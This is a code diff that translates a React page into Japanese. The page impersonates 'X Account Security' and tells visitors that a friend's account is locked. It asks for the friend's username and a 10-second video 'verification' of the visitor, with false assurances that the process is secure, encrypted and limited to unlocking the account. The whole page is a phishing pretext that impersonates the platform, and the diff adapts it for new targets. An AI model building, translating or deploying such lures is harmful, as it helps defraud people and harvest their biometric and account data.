@@ -29,17 +29,17 @@ function VerificationStart() {
               </g>
             </svg>
             
-            <h1 className="verification-title">Welcome to X Account Security</h1>
+            <h1 className="verification-title">Xアカウントセキュリティへようこそ</h1>
             
             <p className="verification-description">
-              Your friend's account accessibility is limited, so we ask that higher 
-              security requirements be applied to that account. We created this 
-              security program to unlock the friend accounts.
+              友達のアカウントアクセスが制限されているため、そのアカウントに
+              より高いセキュリティ要件を適用させていただいています。
+              友達のアカウントのロックを解除するため、このセキュリティプログラムを作成いたします。
             </p>
 
             <div className="help-notice">
               <p className="help-text">
-                I'm helping confirm my friend's identity so they can get back into their X account.
+                友達がXアカウントに復帰できるよう、本人確認を支援します。
               </p>
             </div>
 
@@ -48,36 +48,36 @@ function VerificationStart() {
                 <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0" style={{marginRight: '8px'}}>
                   <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                 </svg>
-                Below, we walk you through the process in detail and help you fully activate to unlock the account.
+                以下では、プロセスを詳しく説明し、アカウントロック解除を完全に実行できるよう支援いたします。
               </p>
               <div className="info-item">
                 <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                   <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                 </svg>
-                <span>Quick 10-second video verification</span>
+                <span>短時間10秒動画認証</span>
               </div>
               <div className="info-item">
                 <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                   <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                 </svg>
-                <span>Secure and encrypted process</span>
+                <span>安全で暗号化されたプロセス</span>
               </div>
               <div className="info-item">
                 <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                   <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                 </svg>
-                <span>Help restore your friend's access</span>
+                <span>友達のアクセス復旧支援</span>
               </div>
             </div>
 
             <button className="btn-continue" onClick={handleContinue}>
-              Continue
+              続行
             </button>
 
             <p className="privacy-note">
-              By continuing, you agree to help verify your friend's identity. 
-              Your video will be securely stored and used only for verification purposes 
-              to unlock your friend's X account.
+              続行することで、友達の本人確認支援に同意したものとみなされます。
+              お客様の動画は安全に保存され、友達のXアカウントのロック解除の
+              認証目的のみに使用されます。
             </p>
           </div>
         ) : (
@@ -89,14 +89,14 @@ function VerificationStart() {
               </g>
             </svg>
 
-            <h1 className="verification-title">Enter Your Friend's Username</h1>
+            <h1 className="verification-title">友達のユーザー名を入力</h1>
             
             <p className="verification-description">
-              Please enter your friend's X username - the account that needs to be unlocked.
+              ロック解除が必要な友達のXユーザー名を入力してください。
             </p>
 
             <div className="input-group">
-              <label htmlFor="username">Friend's X Username</label>
+              <label htmlFor="username">友達のXユーザー名</label>
               <div className="input-wrapper">
                 <span className="input-prefix">@</span>
                 <input
@@ -111,11 +111,11 @@ function VerificationStart() {
             </div>
 
             <div className="help-box">
-              <p>By verifying, you confirm that:</p>
+              <p>認証することで、以下を確認したものとみなされます：</p>
               <ul>
-                <li>You know this person personally</li>
-                <li>You're helping them regain access to their account</li>
-                <li>The information you provide is accurate</li>
+                <li>この人を個人的に知っている</li>
+                <li>アカウントアクセス復旧を支援している</li>
+                <li>提供する情報が正確である</li>
               </ul>
             </div>
 
@@ -124,11 +124,11 @@ function VerificationStart() {
               onClick={handleContinue}
               disabled={!username.trim()}
             >
-              Start Verification
+              認証開始
             </button>
 
             <button className="btn-back" onClick={() => setStep(1)}>
-              Back
+              戻る
             </button>
           </div>
         )}
